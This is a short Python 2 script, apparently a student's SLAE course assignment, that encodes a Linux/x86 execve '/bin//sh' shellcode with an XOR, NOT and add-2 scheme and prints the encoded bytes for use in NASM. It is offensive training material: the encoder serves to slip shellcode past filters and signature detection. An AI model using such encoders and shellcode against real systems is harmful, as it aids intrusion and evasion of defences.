#SLAE - Assignment #3: Custom Encoder (Linux/x86)
#Author:  Dipsy 
#Student ID: SLAE-1535

#!/usr/bin/python

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
raw_shellcode = ""
nasm_shellcode = ""

for x in bytearray(shellcode) :
  #XNOR
  x = x ^ 0xDD
  y = ~x
  #addition 
  z = y + 0x2
  raw_shellcode += '\\x'
  raw_shellcode += '%02x' % (z & 0xff)

  nasm_shellcode += '0x'
  nasm_shellcode += '%02x,' %(z & 0xff)

print '\nRaw Shellcode:' + raw_shellcode
print '\nNASM Shellcode:' + nasm_shellcode
print '\nLength of the shellcode: %d' % len(bytearray(shellcode))
